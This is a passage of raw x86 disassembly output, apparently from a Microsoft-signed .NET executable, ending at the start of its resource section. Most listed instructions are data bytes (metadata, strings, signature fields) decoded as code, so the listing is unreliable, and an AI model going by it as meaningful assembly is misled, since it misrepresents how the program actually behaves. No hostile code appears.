  40b5ea:	push   cs
  40b5eb:	or     BYTE PTR [eax],ah
  40b5ed:	add    ecx,DWORD PTR [esi]
  40b5ef:	push   cs
  40b5f0:	adc    BYTE PTR [edx],al
  40b5f2:	adc    BYTE PTR [edx],al
  40b5f4:	add    al,0x6
  40b5f6:	sbb    eax,0x6032412
  40b5fb:	adc    ch,BYTE PTR [eax]
  40b5fd:	pop    es
  40b5fe:	and    BYTE PTR [edx],al
  40b600:	add    DWORD PTR ds:0x30e1d0e,ebx
  40b606:	and    BYTE PTR [eax],al
  40b608:	or     BYTE PTR [eax+eiz*1],al
  40b60b:	add    BYTE PTR [edx],dl
  40b60d:	and    al,0x3
  40b60f:	sub    BYTE PTR [eax],al
  40b611:	or     BYTE PTR [ecx],dl
  40b613:	and    BYTE PTR [ebx],cl
  40b615:	or     BYTE PTR [esi],cl
  40b617:	push   cs
  40b618:	push   cs
  40b619:	push   cs
  40b61a:	sbb    eax,0xe0e1d0e
  40b61f:	add    al,BYTE PTR [edx]
  40b621:	add    dl,BYTE PTR [ecx]
  40b623:	and    DWORD PTR [ebx],eax
  40b625:	push   es
  40b626:	adc    DWORD PTR [esp+eax*1],esi
  40b629:	add    DWORD PTR [eax],eax
  40b62b:	add    BYTE PTR [eax],al
  40b62d:	add    al,0x2
  40b62f:	add    BYTE PTR [eax],al
  40b631:	add    BYTE PTR [eax+eiz*1],al
  40b634:	add    BYTE PTR [eax],al
  40b636:	add    BYTE PTR [eax+eax*2],al
  40b639:	add    BYTE PTR [eax],al
  40b63b:	add    BYTE PTR [edi],al
  40b63d:	and    BYTE PTR [ebx],al
  40b63f:	add    DWORD PTR [ecx],edx
  40b641:	and    eax,0x20040808
  40b646:	add    DWORD PTR [edx],eax
  40b648:	sbb    al,0x4
  40b64a:	and    BYTE PTR [eax],al
  40b64c:	adc    DWORD PTR ds:0x25110603,esp
  40b652:	add    al,0x28
  40b654:	add    BYTE PTR [ecx],dl
  40b656:	and    eax,0x1012004
  40b65b:	push   cs
  40b65c:	add    al,0x20
  40b65e:	add    BYTE PTR [edx],dl
  40b660:	sub    DWORD PTR ds:0x12010120,eax
  40b666:	sub    DWORD PTR [ebx],eax
  40b668:	push   es
  40b669:	adc    ch,BYTE PTR [ecx]
  40b66b:	add    al,0x28
  40b66d:	add    BYTE PTR [edx],dl
  40b66f:	sub    DWORD PTR ds:0x12080100,eax
  40b675:	pop    eax
  40b676:	pop    es
  40b677:	add    BYTE PTR [edx],al
  40b679:	adc    ch,BYTE PTR [ecx]
  40b67b:	adc    ch,BYTE PTR ds:0x40e
  40b681:	adc    DWORD PTR [eax*1+0x29120100],esi
  40b688:	push   cs
  40b689:	add    eax,DWORD PTR [eax]
  40b68b:	add    BYTE PTR [edx],al
  40b68d:	pop    es
  40b68e:	add    BYTE PTR [edx],al
  40b690:	adc    bh,BYTE PTR [edx+edx*1]
  40b693:	cmp    BYTE PTR [esi],cl
  40b695:	pop    es
  40b696:	add    BYTE PTR [edx],al
  40b698:	adc    ch,BYTE PTR [ecx]
  40b69a:	adc    bh,BYTE PTR [eax]
  40b69c:	push   cs
  40b69d:	pop    es
  40b69e:	add    BYTE PTR [edx],al
  40b6a0:	add    dl,BYTE PTR [edx]
  40b6a2:	sub    eax,0x52111
  40b6a7:	add    DWORD PTR [edx],eax
  40b6a9:	adc    DWORD PTR [ecx],esp
  40b6ab:	push   es
  40b6ac:	add    BYTE PTR [edx],al
  40b6ae:	add    DWORD PTR [esi],ecx
  40b6b0:	adc    dh,BYTE PTR [ecx]
  40b6b2:	or     DWORD PTR [eax],eax
  40b6b4:	add    ecx,DWORD PTR [eax]
  40b6b6:	push   cs
  40b6b7:	adc    DWORD PTR [eax+edx*1],esi
  40b6ba:	adc    ch,BYTE PTR [ecx]
  40b6bc:	or     DWORD PTR [eax],eax
  40b6be:	add    edx,DWORD PTR [edx]
  40b6c0:	sub    DWORD PTR [esi],ecx
  40b6c2:	adc    DWORD PTR [edx+edx*1],esi
  40b6c5:	inc    esp
  40b6c6:	sldt   WORD PTR [esi]
  40b6c9:	add    DWORD PTR [esi],ecx
  40b6cb:	adc    BYTE PTR [ecx],dl
  40b6cd:	and    eax,0x8100810
  40b6d2:	adc    BYTE PTR [edi],al
  40b6d4:	adc    BYTE PTR [edi],al
  40b6d6:	add    eax,DWORD PTR [esi]
  40b6d8:	adc    dh,BYTE PTR ds:0x4c120603
  40b6de:	or     ah,BYTE PTR [eax]
  40b6e0:	push   es
  40b6e1:	push   cs
  40b6e2:	push   cs
  40b6e3:	adc    DWORD PTR ds:0x8070708,esp
  40b6e9:	pop    es
  40b6ea:	and    BYTE PTR [edx],al
  40b6ec:	adc    ch,BYTE PTR ds:0x739121c
  40b6f2:	and    BYTE PTR [ebx],al
  40b6f4:	add    DWORD PTR [ecx],edx
  40b6f6:	cmp    eax,0x20050e08
  40b6fb:	add    DWORD PTR [edx+edx*1],ebx
  40b6fe:	sub    eax,0x1d002004
  40b703:	push   cs
  40b704:	add    al,BYTE PTR [esi]
  40b706:	add    al,BYTE PTR [ebx]
  40b708:	push   es
  40b709:	adc    DWORD PTR [ecx],esp
  40b70b:	add    al,0x0
  40b70d:	add    DWORD PTR [ecx],eax
  40b70f:	push   cs
  40b710:	add    eax,0xe010200
  40b715:	or     BYTE PTR ds:0xe010200,al
  40b71b:	push   cs
  40b71c:	push   es
  40b71d:	add    BYTE PTR [ebx],al
  40b71f:	add    DWORD PTR [esi],ecx
  40b721:	push   cs
  40b722:	or     BYTE PTR [edi],al
  40b724:	add    BYTE PTR [ecx+eax*1],al
  40b727:	push   cs
  40b728:	push   cs
  40b729:	or     BYTE PTR [eax],cl
  40b72b:	or     BYTE PTR [eax],al
  40b72d:	add    eax,0x80e0e01
  40b732:	or     BYTE PTR [eax],cl
  40b734:	add    al,0x0
  40b736:	add    DWORD PTR [ecx],eax
  40b738:	add    al,BYTE PTR [eax+eiz*1]
  40b73b:	add    DWORD PTR [ecx],eax
  40b73d:	add    al,BYTE PTR [esi]
  40b73f:	and    BYTE PTR [ecx],al
  40b741:	add    DWORD PTR [ecx],edx
  40b743:	add    BYTE PTR [ebp+0x1012004],0x8
  40b74a:	and    BYTE PTR [eax+0x2400],0x4
  40b751:	add    BYTE PTR [eax],0x0
  40b754:	xchg   esp,eax
  40b755:	add    BYTE PTR [eax],al
  40b757:	add    BYTE PTR [esi],al
  40b759:	add    al,BYTE PTR [eax]
  40b75b:	add    BYTE PTR [eax],al
  40b75d:	and    al,0x0
  40b75f:	add    BYTE PTR [edx+0x53],dl
  40b762:	inc    ecx
  40b763:	xor    DWORD PTR [eax],eax
  40b765:	add    al,0x0
  40b767:	add    BYTE PTR [ecx],al
  40b769:	add    BYTE PTR [ecx],al
  40b76b:	add    BYTE PTR [edi],al
  40b76d:	sar    edx,1
  40b76f:	push   edi
  40b770:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  40b776:	test   BYTE PTR [edx+0xdfdae0f],ch
  40b77c:	jmp    0xecabb569
  40b781:	pop    DWORD PTR [edi+0x6c7603fb]
  40b787:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  40b78c:	mov    dl,0x3b
  40b78e:	out    0x9a,eax
  40b790:	(bad)  
  40b792:	fadd   st(1),st
  40b794:	fstp   QWORD PTR [edx+0x211336d2]
  40b79a:	add    dl,BYTE PTR [eax-0x6c38df5]
  40b7a0:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  40b7a7:	pop    esi
  40b7a9:	pop    es
  40b7aa:	ja     0x40b7fb
  40b7ac:	sub    eax,ebp
  40b7ae:	xor    cl,BYTE PTR [esi]
  40b7b0:	xchg   edx,eax
  40b7b1:	jmp    0xc021:0xe8e4ec05
  40b7b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7b9:	out    dx,eax
  40b7ba:	call   0x4c9d1cb0
  40b7bf:	or     al,0x93
  40b7c1:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  40b7c8:	stos   BYTE PTR es:[edi],al
  40b7c9:	gs sub al,0x1d
  40b7cc:	cli    
  40b7cd:	(bad)  
  40b7ce:	cmp    eax,0x2d6f5d74
  40b7d3:	in     eax,0xf1
  40b7d5:	jle    0x40b835
  40b7d7:	scas   eax,DWORD PTR es:[edi]
  40b7d8:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  40b7e0:	inc    ebx
  40b7e1:	sbb    BYTE PTR gs:[eax],ah
  40b7e4:	ins    DWORD PTR es:[edi],dx
  40b7e5:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  40b7ec:	or     BYTE PTR [eax],al
  40b7ee:	add    DWORD PTR [edx],edx
  40b7f0:	adc    BYTE PTR [ecx+0x7958011],0x0
  40b7f7:	add    DWORD PTR [edx],edx
  40b7f9:	sub    eax,0x6918012
  40b7fe:	and    BYTE PTR [edx],al
  40b800:	add    DWORD PTR [esi],ecx
  40b802:	adc    ch,BYTE PTR ds:0xe030006
  40b808:	push   cs
  40b809:	push   cs
  40b80a:	push   cs
  40b80b:	add    eax,DWORD PTR [edi]
  40b80d:	add    DWORD PTR [esi],ecx
  40b80f:	pop    es
  40b810:	and    BYTE PTR [edx],al
  40b812:	push   cs
  40b813:	push   cs
  40b814:	adc    al,BYTE PTR [eax+0x20006a1]
  40b81a:	push   cs
  40b81b:	push   cs
  40b81c:	sbb    eax,0x107041c
  40b821:	sbb    eax,0x107031c
  40b826:	or     BYTE PTR ds:0x80120000,al
  40b82c:	mov    eax,ds:0x8040009
  40b831:	push   cs
  40b832:	push   cs
  40b833:	add    dl,BYTE PTR [edx]
  40b835:	and    BYTE PTR [ecx+0x2010004],0xe
  40b83c:	push   es
  40b83d:	add    BYTE PTR [ecx],al
  40b83f:	adc    al,BYTE PTR [eax+0x30eb5]
  40b845:	add    BYTE PTR [esi],cl
  40b847:	or     al,0x0
  40b849:	add    edx,DWORD PTR [edx]
  40b84b:	add    cl,0xe
  40b84e:	adc    al,BYTE PTR [eax-0x427fed3b]
  40b854:	add    al,0x20
  40b856:	add    BYTE PTR [edx],dl
  40b858:	sub    eax,0x12002005
  40b85d:	or     cl,0x7
  40b860:	and    BYTE PTR [edx],al
  40b862:	adc    al,BYTE PTR [eax+0x30e0ecd]
  40b868:	and    BYTE PTR [eax],al
  40b86a:	sbb    al,0x6
  40b86c:	add    BYTE PTR [ecx],al
  40b86e:	add    DWORD PTR [edx],edx
  40b870:	add    cl,0x5
  40b873:	and    BYTE PTR [eax],al
  40b875:	adc    al,BYTE PTR [eax+0xb071791]
  40b87b:	push   cs
  40b87c:	push   cs
  40b87d:	or     BYTE PTR [eax],cl
  40b87f:	or     BYTE PTR [edx],dl
  40b881:	cmp    BYTE PTR [ebp+0x12c18012],0x80
  40b888:	leave  
  40b889:	adc    al,BYTE PTR [eax+0x123012cd]
  40b88f:	xor    DWORD PTR ds:0x80120000,eax
  40b895:	rol    DWORD PTR ds:0x80120020,1
  40b89b:	mov    eax,ds:0x1012006
  40b8a0:	adc    al,BYTE PTR [eax+0x5a1]
  40b8a6:	adc    al,BYTE PTR [eax+0x2005d5]
  40b8ac:	adc    DWORD PTR [eax+0x5d9],eax
  40b8b2:	adc    al,BYTE PTR [eax+0x2005e1]
  40b8b8:	adc    al,BYTE PTR [eax+0x10705e5]
  40b8be:	adc    al,BYTE PTR [eax+0x20705d1]
  40b8c4:	push   cs
  40b8c5:	adc    bl,BYTE PTR ds:0x2012004
  40b8cb:	push   cs
  40b8cc:	push   es
  40b8cd:	and    BYTE PTR [ecx],al
  40b8cf:	sbb    eax,0x1b031d0e
  40b8d4:	pop    es
  40b8d5:	movlps xmm5,QWORD PTR [edx+edx*1]
  40b8d9:	and    al,0xe
  40b8db:	push   cs
  40b8dc:	adc    al,BYTE PTR [eax+0xe1d0e9d]
  40b8e2:	push   cs
  40b8e3:	add    bl,BYTE PTR ds:0x1d031d0e
  40b8e9:	push   cs
  40b8ea:	or     BYTE PTR ds:0x6031d03,bl
  40b8f0:	add    BYTE PTR [ebx],al
  40b8f2:	push   cs
  40b8f3:	sbb    al,0x1c
  40b8f5:	sbb    al,0x5
  40b8f7:	add    BYTE PTR [edx],al
  40b8f9:	push   cs
  40b8fa:	sbb    al,0x1c
  40b8fc:	push   es
  40b8fd:	pop    es
  40b8fe:	add    al,0xe
  40b900:	push   cs
  40b901:	push   cs
  40b902:	or     BYTE PTR [esi],al
  40b904:	and    BYTE PTR [ecx],al
  40b906:	push   cs
  40b907:	adc    al,BYTE PTR [eax+0x12004a1]
  40b90d:	push   cs
  40b90e:	or     BYTE PTR [edi+eax*1],al
  40b911:	add    cl,BYTE PTR [eax]
  40b913:	push   cs
  40b914:	push   es
  40b915:	pop    es
  40b916:	add    al,0xe
  40b918:	or     BYTE PTR [edx],al
  40b91a:	or     BYTE PTR ds:0x1d080120,al
  40b920:	add    eax,DWORD PTR ds:0x80e0220
  40b926:	or     BYTE PTR [edx],cl
  40b928:	add    BYTE PTR [ebx],al
  40b92a:	add    DWORD PTR [edx],edx
  40b92c:	cmp    ch,0x12
  40b92f:	cmp    ch,0x8
  40b932:	adc    DWORD PTR [edi],eax
  40b934:	or     ecx,DWORD PTR [eax]
  40b936:	or     BYTE PTR [eax],cl
  40b938:	sbb    eax,0x24121d0e
  40b93d:	push   cs
  40b93e:	push   cs
  40b93f:	add    al,BYTE PTR [edx]
  40b941:	or     BYTE PTR ds:0x1070403,bl
  40b947:	adc    bl,BYTE PTR [eax+0x7]
  40b94a:	add    BYTE PTR [edx],al
  40b94c:	add    dl,BYTE PTR [ecx]
  40b94e:	and    eax,0x7042511
  40b953:	add    DWORD PTR [edx],edx
  40b955:	cmp    BYTE PTR ds:0x2d120100,al
  40b95b:	push   cs
  40b95c:	add    eax,0xe0e0200
  40b961:	push   cs
  40b962:	or     BYTE PTR [edi],al
  40b964:	add    al,0x8
  40b966:	adc    ch,BYTE PTR ds:0xa083112
  40b96c:	and    BYTE PTR [esp+ebx*1],al
  40b96f:	adc    ch,BYTE PTR ds:0x1221110e
  40b975:	adc    DWORD PTR ds:0x81120507,ecx
  40b97b:	add    eax,0x29125412
  40b980:	adc    dl,BYTE PTR [eax+0x12]
  40b983:	xor    DWORD PTR ds:0x29120207,eax
  40b989:	or     BYTE PTR ds:0x1c010220,al
  40b98f:	sbb    al,0x4
  40b991:	and    BYTE PTR [ecx],al
  40b993:	push   cs
  40b994:	push   cs
  40b995:	add    eax,0x1d0e0100
  40b99a:	push   cs
  40b99b:	pop    ss
  40b99c:	pop    es
  40b99d:	femms  
  40b99f:	adc    DWORD PTR ds:0x8080707,esp
  40b9a5:	adc    al,BYTE PTR [ecx+0x31120e0d]
  40b9ab:	push   cs
  40b9ac:	add    bl,BYTE PTR ds:0xe1d080e
  40b9b2:	or     BYTE PTR [eax+eiz*1],al
  40b9b5:	add    DWORD PTR [esp+ebx*1],ebx
  40b9b8:	adc    eax,DWORD PTR [edi]
  40b9ba:	or     al,0x12
  40b9bc:	cmp    al,0xe
  40b9be:	push   cs
  40b9bf:	adc    DWORD PTR ds:0x8080707,esp
  40b9c5:	adc    bh,BYTE PTR [ebx*1+0x2511080e]
  40b9cc:	add    al,0x7
  40b9ce:	add    DWORD PTR [edx],edx
  40b9d0:	cmp    al,0x5
  40b9d2:	and    BYTE PTR [eax],al
  40b9d4:	adc    al,BYTE PTR [ecx+0x2200b19]
  40b9da:	add    DWORD PTR [eax],edx
  40b9dc:	adc    DWORD PTR [ecx-0x7eeeefe3],eax
  40b9e2:	and    DWORD PTR [eax],ecx
  40b9e4:	pop    es
  40b9e5:	add    dl,BYTE PTR [ecx]
  40b9e7:	sbb    DWORD PTR ds:0xa218111,0x81110407
  40b9f1:	sbb    eax,0x2218111
  40b9f6:	add    ch,BYTE PTR [ecx]
  40b9f8:	add    DWORD PTR [eax],eax
  40b9fa:	and    al,0x38
  40b9fc:	inc    esi
  40b9fd:	xor    BYTE PTR [edx],dh
  40b9ff:	ss inc ebp
  40ba01:	inc    esp
  40ba02:	inc    edx
  40ba03:	sub    eax,0x45353837
  40ba08:	sub    eax,0x30373434
  40ba0d:	sub    eax,0x31453841
  40ba12:	sub    eax,0x38453442
  40ba17:	xor    al,0x45
  40ba19:	cmp    DWORD PTR [ecx+esi*1+0x37],eax
  40ba1d:	aaa    
  40ba1e:	cmp    DWORD PTR [eax],eax
  40ba20:	add    BYTE PTR [esi],al
  40ba22:	and    BYTE PTR [ecx],al
  40ba24:	add    DWORD PTR [ecx],edx
  40ba26:	sub    DWORD PTR ds:0x1000108,0x0
  40ba30:	add    BYTE PTR ds:0x80120000,al
  40ba36:	rol    DWORD PTR ds:0x1c010220,0x18
  40ba3d:	push   es
  40ba3e:	and    BYTE PTR [ecx],al
  40ba40:	add    DWORD PTR [edx],edx
  40ba42:	xor    DWORD PTR ds:0x1d010704,0x2200703
  40ba4c:	add    cl,BYTE PTR [esi]
  40ba4e:	adc    DWORD PTR [ecx+0x10071739],eax
  40ba54:	push   cs
  40ba55:	adc    ch,BYTE PTR ds:0xc980120e
  40ba5b:	push   cs
  40ba5c:	push   cs
  40ba5d:	push   cs
  40ba5e:	push   cs
  40ba5f:	push   cs
  40ba60:	push   cs
  40ba61:	push   cs
  40ba62:	push   cs
  40ba63:	sbb    eax,0xe1d080e
  40ba68:	or     BYTE PTR [ecx],ch
  40ba6a:	add    DWORD PTR [eax],eax
  40ba6c:	and    al,0x30
  40ba6e:	xor    BYTE PTR [eax],dh
  40ba70:	xor    dh,BYTE PTR [eax]
  40ba72:	xor    al,0x30
  40ba74:	ss sub eax,0x30303030
  40ba7a:	sub    eax,0x30303030
  40ba7f:	sub    eax,0x30303043
  40ba84:	sub    eax,0x30303030
  40ba89:	xor    BYTE PTR [eax],dh
  40ba8b:	xor    BYTE PTR [eax],dh
  40ba8d:	xor    BYTE PTR [eax],dh
  40ba8f:	xor    al,0x36
  40ba91:	add    BYTE PTR [eax],al
  40ba93:	or     DWORD PTR [eax],eax
  40ba95:	add    eax,DWORD PTR [ecx]
  40ba97:	adc    ch,BYTE PTR ds:0x8100810
  40ba9d:	push   es
  40ba9e:	add    BYTE PTR [ecx],al
  40baa0:	adc    DWORD PTR ds:0x20052d12,esp
  40baa6:	add    BYTE PTR [edx],dl
  40baa8:	or     DWORD PTR [ecx+0x15],0x29120b07
  40baaf:	adc    al,BYTE PTR [eax+0x8080ec9]
  40bab5:	adc    DWORD PTR ds:0x81123812,esp
  40babb:	dec    ecx
  40babc:	adc    bh,BYTE PTR [esi+ecx*1]
  40babf:	push   cs
  40bac0:	or     ah,BYTE PTR [eax]
  40bac2:	add    eax,DWORD PTR [ecx]
  40bac4:	push   cs
  40bac5:	adc    DWORD PTR [ecx+0x59811155],eax
  40bacb:	pop    es
  40bacc:	and    BYTE PTR [edx],al
  40bace:	add    DWORD PTR [edx],edx
  40bad0:	and    DWORD PTR [ecx+0x2],0x12002005
  40bad7:	and    DWORD PTR [ecx+0x7],0xa0a0220
  40bade:	adc    DWORD PTR [ecx+0x1200465],eax
  40bae4:	or     BYTE PTR [ebx],al
  40bae6:	add    al,0x20
  40bae8:	add    DWORD PTR [eax],ecx
  40baea:	sbb    al,0x4
  40baec:	and    BYTE PTR [eax],al
  40baee:	sbb    eax,0x6070f1c
  40baf3:	push   cs
  40baf4:	adc    al,BYTE PTR [ecx+0x5181124d]
  40bafa:	adc    al,BYTE PTR [ecx+0xe1d085d]
  40bb00:	add    eax,0x81120000
  40bb05:	ins    DWORD PTR es:[edi],dx
  40bb06:	push   es
  40bb07:	and    BYTE PTR [ebx],al
  40bb09:	add    DWORD PTR [esi],ecx
  40bb0b:	sbb    al,0x1c
  40bb0d:	pop    es
  40bb0e:	and    BYTE PTR [ecx+eax*1],al
  40bb11:	push   cs
  40bb12:	sbb    al,0x1c
  40bb14:	sbb    al,0x6
  40bb16:	and    BYTE PTR [edx],al
  40bb18:	add    DWORD PTR [esi],ecx
  40bb1a:	sbb    eax,0x207051c
  40bb1f:	push   cs
  40bb20:	sbb    eax,0x220051c
  40bb25:	add    DWORD PTR [esi],ecx
  40bb27:	sbb    al,0x5
  40bb29:	add    DWORD PTR [eax],eax
  40bb2b:	add    BYTE PTR [eax],al
  40bb2d:	add    BYTE PTR ds:0x10001,al
  40bb33:	add    BYTE PTR [edi],cl
  40bb35:	add    DWORD PTR [eax],eax
  40bb37:	or     dl,BYTE PTR [esp+ebp*2+0x62]
  40bb3b:	inc    ebp
  40bb3c:	js     0x40bbae
  40bb3e:	cs gs js 0x40bba7
  40bb42:	add    BYTE PTR [eax],al
  40bb44:	sbb    al,BYTE PTR [ecx]
  40bb46:	add    BYTE PTR ds:0x7263694d,dl
  40bb4c:	outs   dx,DWORD PTR ds:[esi]
  40bb4d:	jae    0x40bbbe
  40bb4f:	data16 je 0x40bb72
  40bb52:	inc    ebx
  40bb53:	outs   dx,DWORD PTR ds:[esi]
  40bb54:	jb     0x40bbc6
  40bb56:	outs   dx,DWORD PTR ds:[esi]
  40bb57:	jb     0x40bbba
  40bb59:	je     0x40bbc4
  40bb5b:	outs   dx,DWORD PTR ds:[esi]
  40bb5c:	outs   dx,BYTE PTR ds:[esi]
  40bb5d:	add    BYTE PTR [eax],al
  40bb5f:	pop    ds
  40bb60:	add    DWORD PTR [eax],eax
  40bb62:	sbb    cl,BYTE PTR [ebp+0x69]
  40bb65:	arpl   WORD PTR [edx+0x6f],si
  40bb68:	jae    0x40bbd9
  40bb6a:	data16 je 0x40bb2f
  40bb6d:	scas   al,BYTE PTR es:[edi]
  40bb6e:	and    BYTE PTR [esi],ch
  40bb70:	dec    esi
  40bb71:	inc    ebp
  40bb72:	push   esp
  40bb73:	and    BYTE PTR [esi+0x72],al
  40bb76:	popa   
  40bb77:	ins    DWORD PTR es:[edi],dx
  40bb78:	gs ja  0x40bbea
  40bb7b:	jb     0x40bbe8
  40bb7d:	add    BYTE PTR [eax],al
  40bb7f:	xor    al,0x1
  40bb81:	add    BYTE PTR [edi],ch
  40bb83:	ret    0x20a9
  40bb86:	dec    ebp
  40bb87:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40bb8e:	je     0x40bbb0
  40bb90:	inc    ebx
  40bb91:	outs   dx,DWORD PTR ds:[esi]
  40bb92:	jb     0x40bc04
  40bb94:	outs   dx,DWORD PTR ds:[esi]
  40bb95:	jb     0x40bbf8
  40bb97:	je     0x40bc02
  40bb99:	outs   dx,DWORD PTR ds:[esi]
  40bb9a:	outs   dx,BYTE PTR ds:[esi]
  40bb9b:	and    BYTE PTR cs:[eax],ah
  40bb9e:	inc    ecx
  40bb9f:	ins    BYTE PTR es:[edi],dx
  40bba0:	ins    BYTE PTR es:[edi],dx
  40bba1:	and    BYTE PTR [edx+0x69],dh
  40bba4:	addr16 push 0x72207374
  40bbaa:	gs jae 0x40bc12
  40bbad:	jb     0x40bc25
  40bbaf:	gs fs add BYTE PTR cs:[eax],al
  40bbb4:	adc    BYTE PTR [ecx],al
  40bbb6:	add    BYTE PTR [ebx],cl
  40bbb8:	xor    ebp,DWORD PTR [esi]
  40bbba:	xor    eax,0x3730332e
  40bbbf:	xor    bh,BYTE PTR [ecx]
  40bbc1:	xor    DWORD PTR cs:[eax],eax
  40bbc4:	add    BYTE PTR [ecx+eax*1],cl
  40bbc7:	add    BYTE PTR [edi],al
  40bbc9:	xor    ebp,DWORD PTR [esi]
  40bbcb:	xor    eax,0x302e302e
  40bbd0:	add    BYTE PTR [eax],al
  40bbd2:	or     al,BYTE PTR [ecx]
  40bbd4:	add    BYTE PTR ds:0x552d6e65,al
  40bbda:	push   ebx
  40bbdb:	add    BYTE PTR [eax],al
  40bbdd:	sub    al,BYTE PTR [ecx]
  40bbdf:	add    BYTE PTR ds:0x645c3a66,ah
  40bbe5:	fs pop esp
  40bbe7:	push   esp
  40bbe8:	outs   dx,DWORD PTR ds:[esi]
  40bbe9:	outs   dx,DWORD PTR ds:[esi]
  40bbea:	ins    BYTE PTR es:[edi],dx
  40bbeb:	jae    0x40bc49
  40bbed:	fs gs jbe 0x40bc55
  40bbf1:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  40bbf8:	ins    BYTE PTR es:[edi],dx
  40bbf9:	push   eax
  40bbfa:	jne    0x40bc5e
  40bbfc:	ins    BYTE PTR es:[edi],dx
  40bbfd:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  40bc04:	outs   dx,BYTE PTR ds:[esi]
  40bc05:	imul   eax,DWORD PTR [eax],0x0
  40bc08:	or     BYTE PTR [ecx],al
  40bc0a:	add    BYTE PTR [edx],al
  40bc0c:	add    BYTE PTR [eax],al
  40bc0e:	add    BYTE PTR [eax],al
  40bc10:	add    BYTE PTR [eax],cl
  40bc12:	add    DWORD PTR [eax],eax
  40bc14:	or     BYTE PTR [eax],al
  40bc16:	add    BYTE PTR [eax],al
  40bc18:	add    BYTE PTR [eax],al
  40bc1a:	push   ds
  40bc1b:	add    DWORD PTR [eax],eax
  40bc1d:	add    DWORD PTR [eax],eax
  40bc1f:	push   esp
  40bc20:	add    dl,BYTE PTR [esi]
  40bc22:	push   edi
  40bc23:	jb     0x40bc86
  40bc25:	jo     0x40bc75
  40bc27:	outs   dx,DWORD PTR ds:[esi]
  40bc28:	outs   dx,BYTE PTR ds:[esi]
  40bc29:	inc    ebp
  40bc2a:	js     0x40bc8f
  40bc2c:	gs jo  0x40bca3
  40bc2f:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  40bc36:	ja     0x40bcab
  40bc38:	add    DWORD PTR [eax],eax
  40bc3a:	add    BYTE PTR [eax],al
  40bc3c:	add    BYTE PTR [eax],al
  40bc3e:	add    BYTE PTR [eax],al
  40bc40:	mov    ebx,0x488ef6
  40bc45:	add    BYTE PTR [eax],al
  40bc47:	add    BYTE PTR [edx],al
  40bc49:	add    BYTE PTR [eax],al
  40bc4b:	add    BYTE PTR [ebx],ah
  40bc4d:	add    BYTE PTR [eax],al
  40bc4f:	add    BYTE PTR [eax-0x44],bl
  40bc52:	add    BYTE PTR [eax],al
  40bc54:	pop    eax
  40bc55:	lods   al,BYTE PTR ds:[esi]
  40bc56:	add    BYTE PTR [eax],al
  40bc58:	push   edx
  40bc59:	push   ebx
  40bc5a:	inc    esp
  40bc5b:	push   ebx
  40bc5c:	add    BYTE PTR [edx],ch
  40bc5e:	mov    ds:0xc421fd9f,eax
  40bc63:	inc    edx
  40bc64:	mov    ecx,0xe5d483c6
  40bc69:	rol    BYTE PTR [esp+ebx*1],0x1
  40bc6d:	add    BYTE PTR [eax],al
  40bc6f:	add    BYTE PTR [esp+ebp*2+0x62],dl
  40bc73:	inc    ebp
  40bc74:	js     0x40bce6
  40bc76:	cs jo  0x40bcdd
  40bc79:	bound  eax,QWORD PTR [eax]
	...
  40bca7:	add    al,dl
  40bca9:	mov    esp,0x0
  40bcae:	add    BYTE PTR [eax],al
  40bcb0:	add    BYTE PTR [eax],al
  40bcb2:	add    BYTE PTR [eax],al
  40bcb4:	out    dx,al
  40bcb5:	mov    esp,0x20000000
	...
  40bcce:	add    BYTE PTR [eax],al
  40bcd0:	loopne 0x40bc8e
	...
  40bce2:	pop    edi
  40bce3:	inc    ebx
  40bce4:	outs   dx,DWORD PTR ds:[esi]
  40bce5:	jb     0x40bd2c
  40bce7:	js     0x40bd4e
  40bce9:	dec    ebp
  40bcea:	popa   
  40bceb:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  40bcf2:	jb     0x40bd59
  40bcf4:	gs cs fs ins BYTE PTR es:[edi],dx
  40bcf8:	ins    BYTE PTR es:[edi],dx
  40bcf9:	add    BYTE PTR [eax],al
  40bcfb:	add    BYTE PTR [eax],al
  40bcfd:	add    bh,bh
  40bcff:	and    eax,0x402000

Disassembly of section .rsrc:

0040c000 <.rsrc>:
	...
  40c00c:	add    BYTE PTR [eax],al
  40c00e:	add    al,BYTE PTR [eax]
  40c010:	adc    BYTE PTR [eax],al
  40c012:	add    BYTE PTR [eax],al
  40c014:	and    BYTE PTR [eax],al
  40c016:	add    BYTE PTR [eax+0x18],al
  40c01c:	cmp    BYTE PTR [eax],al
  40c01e:	add    BYTE PTR [eax+0x0],al
	...
  40c02c:	add    BYTE PTR [eax],al
  40c02e:	add    DWORD PTR [eax],eax
  40c030:	add    DWORD PTR [eax],eax
  40c032:	add    BYTE PTR [eax],al
  40c034:	push   eax
  40c035:	add    BYTE PTR [eax],al
  40c037:	add    BYTE PTR [eax],0x0
	...
  40c046:	add    DWORD PTR [eax],eax
  40c048:	add    DWORD PTR [eax],eax
  40c04a:	add    BYTE PTR [eax],al
  40c04c:	push   0x800000
	...
  40c05d:	add    BYTE PTR [ecx],al
  40c05f:	add    BYTE PTR [ecx],cl
  40c061:	add    al,0x0
  40c063:	add    BYTE PTR [eax+0x0],al
	...
  40c075:	add    BYTE PTR [ecx],al
  40c077:	add    BYTE PTR [ecx],cl
  40c079:	add    al,0x0
  40c07b:	add    BYTE PTR [eax-0x60000000],dl
  40c081:	rol    BYTE PTR [eax],0x0
  40c084:	add    al,0x4
	...
  40c08e:	add    BYTE PTR [eax],al
  40c090:	test   al,0xc4
  40c092:	add    BYTE PTR [eax],al
  40c094:	jg     0x40c097
	...
  40c09e:	add    BYTE PTR [eax],al
  40c0a0:	add    al,0x4
  40c0a2:	xor    al,0x0
  40c0a4:	add    BYTE PTR [eax],al
  40c0a6:	push   esi
  40c0a7:	add    BYTE PTR [ebx+0x0],dl
  40c0aa:	pop    edi
  40c0ab:	add    BYTE PTR [esi+0x0],dl
  40c0ae:	inc    ebp
  40c0af:	add    BYTE PTR [edx+0x0],dl
  40c0b2:	push   ebx
  40c0b3:	add    BYTE PTR [ecx+0x0],cl
